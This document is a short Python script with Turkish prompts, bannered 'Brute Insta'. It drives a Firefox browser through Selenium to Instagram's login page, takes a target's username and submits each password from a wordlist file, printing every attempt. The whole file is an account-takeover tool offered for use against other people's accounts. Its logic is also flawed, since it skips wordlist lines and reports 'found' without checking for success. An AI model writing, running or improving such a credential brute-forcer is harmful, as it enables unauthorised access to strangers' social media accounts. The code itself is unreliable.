from selenium import webdriver
import os
import time
from colorama import Fore, Back, Style, init
init(autoreset=True)

banner = """

                                                               
 .oPYo.                o            o                o         
 8   `8                8                             8         
o8YooP' oPYo. o    o  o8P .oPYo.   o8 odYo. .oPYo.  o8P .oPYo. 
 8   `b 8  `' 8    8   8  8oooo8    8 8' `8 Yb..     8  .oooo8 
 8    8 8     8    8   8  8.        8 8   8   'Yb.   8  8    8 
 8oooP' 8     `YooP'   8  `Yooo'    8 8   8 `YooP'   8  `YooP8 
:......:..:::::.....:::..::.....::::....::..:.....:::..::.....:
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""
print(Fore.YELLOW + banner)

print(Fore.RED + "=V1.0b")

print(Fore.BLUE + "CREATED BY MARS")

print("===========================")


print(Fore.RED + "[1] Start Brute Insta")

print(Fore.RED +  "[2] Exit")
a = input(Fore.YELLOW + "Termux~C/>")

if (a=="1"):

   def brute_force():
          user=input("hedefin kullanıcı adı: ")
          tarayıcı=webdriver.Firefox()
          time.sleep(3)
          hedef=tarayıcı.get("https://www.instagram.com/")
          time.sleep(3)
          wordlist=open("wordlist.txt","r")
          for atak in wordlist:
                  username=tarayıcı.find_element_by_name("username")
                  password=tarayıcı.find_element_by_name("password")
                  giriş_buton=tarayıcı.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[4]/button/div')
                  satır=wordlist.readline()
                  username.send_keys(user)
                  password.send_keys(satır)
                  print("denenen şifre: ",satır)
                  giriş_buton.click()
                  time.sleep(3)
                  tarayıcı.refresh()
                  time.sleep(4)
          else: 
                 print("Şifre bulundu(yada wordlist'iniz bitti) : ",satır)
   brute_force()

elif(a=="2"):
   exit()
